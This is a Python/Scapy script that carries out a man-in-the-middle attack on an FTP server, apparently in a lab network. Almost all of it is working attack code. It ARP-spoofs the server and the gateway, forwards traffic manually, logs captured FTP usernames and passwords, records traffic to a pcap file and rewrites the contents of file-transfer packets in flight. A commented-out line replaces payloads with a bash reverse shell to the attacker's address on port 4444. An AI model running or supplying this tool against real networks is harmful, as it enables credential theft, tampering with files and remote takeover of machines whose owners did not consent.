#!/usr/bin/env python3
"""
MITM Packet Sniffer & Forwarder - FTP Interceptor (EPSV-Aware)
──────────────────────────────────────────────────────────────

🧠 Purpose:
    Perform a Man-in-the-Middle (MITM) attack between an FTP server and a client,
    specifically handling cross-subnet scenarios where only the FTP server is
    reachable on the same subnet as the attacker. This script captures login
    credentials, monitors data transfers, and supports packet modification.

📌 Key Features:
    - ARP spoofing between FTP server and gateway (client is on a different subnet)
    - Packet sniffing and forwarding (manual, not kernel IP forwarding)
    - EPSV (Extended Passive Mode) detection for dynamic FTP data channels
    - Raw payload inspection: captures USER/PASS, RETR/STOR, EPSV commands
    - Optional packet modification (e.g., replace content of FTP file upload)
    - Stores all observed packets in a `.pcap` file
    - Graceful ARP restoration on exit

🛠 Requirements:
    - Python 3.x
    - Scapy library (`pip install scapy`)
    - Root privileges (required for raw sockets and interface access)
    - Interface must be set correctly (default: eth0)
    

📝 Author: Ben
"""


#!/usr/bin/env python3


from scapy.all import *
import time
import threading
import signal
import sys
import os
import re

modified_packet = None

# Configuration
interface      = "eth0"

# IP addresses
ftp_server_ip  = "192.168.2.8"   # FTP Server
client_ip      = "192.168.3.1"   # FTP Client (in different subnet)
gateway_ip     = "192.168.2.254" # Network Gateway

# Attacker machine details
attacker_ip    = "192.168.2.2"

# MAC addresses (will be auto-detected)
ftp_server_mac = None
attacker_mac   = None
gateway_mac    = None

# PCAP file for saving captured packets
pcap_filename  = "captured_traffic.pcap"

# Store active data channels (for file transfer)
data_channels = {}

def get_mac(ip):
    """
    Get the MAC address of an IP using an ARP request.
    """
    try:
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=2, verbose=False, iface=interface)
        for _, rcv in ans:
            return rcv[Ether].src
    except Exception as e:
        print(f"Error getting MAC for {ip}: {e}")
    return None

def get_self_mac():
    """
    Get the MAC address of the attacker machine's interface.
    """
    try:
        return get_if_hwaddr(interface)
    except Exception as e:
        print(f"Error getting own MAC address: {e}")
        return None

def arp_spoof(target_ip, target_mac, spoof_ip):
    """
    Send an ARP reply to a target, making it think that spoof_ip belongs to attacker_mac.
    """
    try:
        packet = ARP(op=2, pdst=target_ip, hwdst=target_mac,
                    psrc=spoof_ip, hwsrc=attacker_mac)
        send(packet, iface=interface, verbose=False)
    except Exception as e:
        print(f"Error in ARP spoofing: {e}")

def restore_arp(target_ip, target_mac, source_ip, source_mac):
    """
    Restore original ARP mappings by sending correct ARP replies.
    """
    try:
        packet = ARP(op=2, pdst=target_ip, hwdst=target_mac,
                    psrc=source_ip, hwsrc=source_mac)
        send(packet, iface=interface, verbose=False)
        print(f"Restored ARP for {target_ip} -> {source_ip}")
    except Exception as e:
        print(f"Error restoring ARP: {e}")

def cleanup():
    """
    Restore original ARP mappings by sending correct ARP replies to all affected hosts.
    """
    print("\n[*] Restoring ARP tables...")
    # Restore ARP tables multiple times to ensure it takes effect
    for _ in range(3):
        # FTP server should know gateway's real MAC
        restore_arp(ftp_server_ip, ftp_server_mac, gateway_ip, gateway_mac)
        # Gateway should know FTP server's real MAC
        restore_arp(gateway_ip, gateway_mac, ftp_server_ip, ftp_server_mac)
        time.sleep(0.5)
    
    sys.exit(0)

def start_arp_spoofing():
    """
    Continuously send ARP spoof packets at a high frequency.
    Focus on the FTP server and gateway since the client is in another subnet.
    """
    print("[*] Starting ARP spoofing...")
    while True:
        try:
            # Spoof FTP server → Make it think attacker is the gateway
            arp_spoof(ftp_server_ip, ftp_server_mac, gateway_ip)
            
            # Spoof gateway → Make it think attacker is the FTP server
            arp_spoof(gateway_ip, gateway_mac, ftp_server_ip)

            # Send more frequently for better reliability
            time.sleep(0.5)
        except Exception as e:
            print(f"Error in ARP spoofing thread: {e}")
            time.sleep(1)

def capture_ftp_data_channel(packet):
    """
    Capture and store the data channel for FTP traffic based on the EPSV 229 response.
    """
    # Check if the packet contains TCP and Raw data layer
    if packet.haslayer(TCP) and packet.haslayer(Raw):
        payload = packet[Raw].load.decode('utf-8', errors='ignore')

        # Look for the 229 response (EPSV mode)
        if "229" in payload:
            print(f"[FTP] 229 response captured: {payload.strip()}")
            match = re.search(r"229 Entering extended passive mode \(\|*\|*(\d+)\|*\)", payload)
            if match:
                port = int(match.group(1))  # Extract port number
                ip = packet[IP].src  # Source IP is assumed to be the FTP server IP
                data_channels[(ip, packet[IP].dst)] = (ip, port)  # Store the data channel
                print(f"[FTP] Data channel opened for file transfer (EPSV): {ip}:{port}")

def monitor_data_transfer(packet):
    """
    Monitor the FTP data transfer on the specific data channel.
    """
    global modified_packet  # Declare the global variable to modify it

    if packet.haslayer(TCP):
        src_ip = packet[IP].src
        dst_ip = packet[IP].dst

        # Check if this packet is associated with a known data channel
        if (src_ip, dst_ip) in data_channels:
            data_channel_ip, data_channel_port = data_channels[(src_ip, dst_ip)]

            # Monitor only packets going to/from the specified data channel port
            if packet[TCP].dport == data_channel_port or packet[TCP].sport == data_channel_port:
                print(f"[FTP] Data transfer on channel ({data_channel_ip}:{data_channel_port}) -> {len(packet)} bytes")
                packet_size = len(packet)
                
                if packet_size == 110:
                    print(f"[FTP] Specific packet size of 110 bytes detected!")
                    
                    # Modify the packet (example: changing the payload)
                    modified_packet = packet.copy()

                    # Example modification: Change the packet's Raw data layer
                    if modified_packet.haslayer(Raw):
                        #modified_packet[Raw].load = b"bash -i >&   /dev/tcp/192.168.2.2/4444 0>&1"  # Modify content as needed
                        modified_packet[Raw].load = b"ping 192.168.2.3"  # Modify content as needed

                    # Optionally, change the packet's IP, ports, or any other field
                    # modified_packet[IP].src = "new_source_ip"
                    print(f"[FTP] Packet modified!")

def process_packet(packet):
    """
    Process and forward packets without relying on system IP forwarding.
    Focus on intercepting traffic between FTP server and gateway.
    """
    global modified_packet

    # Only process IP packets with Ethernet headers
    if not packet.haslayer(Ether) or not packet.haslayer(IP):
        return

    # Don't process ARP packets generated by our spoofing
    if packet.haslayer(ARP):
        return
    
    # Don't process packets we're sending ourselves to avoid loops
    if packet[Ether].src == attacker_mac:
        return

    # Save all valid packets to PCAP
    wrpcap(pcap_filename, packet, append=True)

    # Extract packet details
    src_mac = packet[Ether].src
    dst_mac = packet[Ether].dst
    src_ip = packet[IP].src
    dst_ip = packet[IP].dst

    # Log FTP credentials if present
    if packet.haslayer(TCP) and packet.haslayer(Raw):
        try:
            payload = packet[Raw].load.decode('utf-8', errors='ignore')
            if "USER" in payload or "PASS" in payload:
                print(f"[FTP] Credentials captured: {payload.strip()}")
            elif "RETR" in payload or "STOR" in payload:
                print(f"[FTP] File transfer command: {payload.strip()}")
            elif "EPSV" in payload:
                print(f"[FTP] File transfer command: {payload.strip()}")
            
            # Capture data channel info when 229 response is detected
            capture_ftp_data_channel(packet)
        except:
            pass

    # Monitor data transfer on the specific channel
    monitor_data_transfer(packet)

    if modified_packet:
        # Forward the modified packet if it was altered
        #try:
            #sendp(modified_packet, iface=interface, verbose=False)
            print(f"[FTP] Forwarded modified packet with size {len(modified_packet)} bytes.")
            packet = modified_packet.copy()
            #modified_packet.show()
            modified_packet = None  # Reset the modified_packet after forwarding
            #packet.show()
 #return  # Don't forward the original packet
        #except Exception as e:
            #print(f"Error forwarding modified packet: {e}")
    
    # Forward the original packet if no modification was made
    #try:
        # Make a copy of the packet for forwarding
     #   new_packet = packet.copy()

      #  # Forward logic (same as before)
       # if new_packet[IP].src == ftp_server_ip:
        #    # Traffic from FTP server
         #   new_packet[Ether].src = attacker_mac
          #  new_packet[Ether].dst = gateway_mac
           # print(f"[>] FTP server -> Gateway (for {packet[IP].dst}): {len(packet)} bytes")
        
       # elif new_packet[IP].dst == ftp_server_ip:
        #    # Traffic to FTP server
         #   new_packet[Ether].src = attacker_mac
          #  new_packet[Ether].dst = ftp_server_mac
           # print(f"[<] {packet[IP].src} -> FTP server: {len(packet)} bytes")
        
       # else:
            # Unrelated traffic, don't forward
 #           return
#
        # Adjust TTL and checksums
        #if new_packet[IP].ttl > 1:
         #   new_packet[IP].ttl -= 1
        
        # Delete checksums to force recalculation
        #del new_packet[IP].chksum
        #if# new_packet.haslayer(TCP):
         #   del new_packet[TCP].chksum
        #elif new_packet.haslayer(UDP):
       #     del new_packet[UDP].chksum
        
        # Forward the packet
      #  sendp(new_packet, iface=interface, verbose=False)
        
        

    #except Exception as e:
     #   print(f"Error forwarding packet: {e}")
  #      modified_packet = None
   #     return

    # Make a copy of the packet for forwarding
    try:
        new_packet = packet.copy()
    except:
        # If copying fails, try to create from raw bytes
        try:
            new_packet = Ether(bytes(packet))
        except:
            print("[!] Failed to clone packet")
            return

    # Packet forwarding logic focused on FTP server and gateway
    try:
        # Determine forwarding based on source and destination
        if src_ip == ftp_server_ip:
            # Traffic from FTP server
            new_packet[Ether].src = attacker_mac
            new_packet[Ether].dst = gateway_mac
            print(f"[>] FTP server -> Gateway (for {dst_ip}): {len(packet)} bytes")
        
        elif dst_ip == ftp_server_ip:
            # Traffic to FTP server
            new_packet[Ether].src = attacker_mac
            new_packet[Ether].dst = ftp_server_mac
            print(f"[<] {src_ip} -> FTP server: {len(packet)} bytes")
        
        else:
            # Unrelated traffic, don't forward
            return

        # Adjust TTL and checksums
        if new_packet[IP].ttl > 1:
            new_packet[IP].ttl -= 1
        
        # Delete checksums to force recalculation
        del new_packet[IP].chksum
        if new_packet.haslayer(TCP):
            del new_packet[TCP].chksum
        elif new_packet.haslayer(UDP):
            del new_packet[UDP].chksum
        
        # Forward the packet
        sendp(new_packet, iface=interface, verbose=False)
        new_packet.show()
    except Exception as e:
        print(f"Error forwarding packet: {e}")

def sniff_and_forward():
    """
    Sniff traffic involving the FTP server.
    """
    print("[*] Starting packet sniffing and forwarding...")
    # Create a filter to capture relevant traffic
    bpf_filter = f"host {ftp_server_ip} and not arp"
    try:
        sniff(filter=bpf_filter, prn=process_packet, store=0, iface=interface)
    except Exception as e:
        print(f"Error during packet sniffing: {e}")

if __name__ == "__main__":
    # Set up exit handler to restore ARP tables
    signal.signal(signal.SIGINT, cleanup)

    # Get initial MAC addresses
    ftp_server_mac = get_mac(ftp_server_ip)
    gateway_mac    = get_mac(gateway_ip)
    attacker_mac   = get_self_mac()

    if not (ftp_server_mac and gateway_mac and attacker_mac):
        print("Error: Could not retrieve all necessary MAC addresses.")
        sys.exit(1)

    # Start ARP spoofing and packet sniffing
    spoof_thread = threading.Thread(target=start_arp_spoofing)
    spoof_thread.daemon = True
    spoof_thread.start()

    sniff_and_forward()
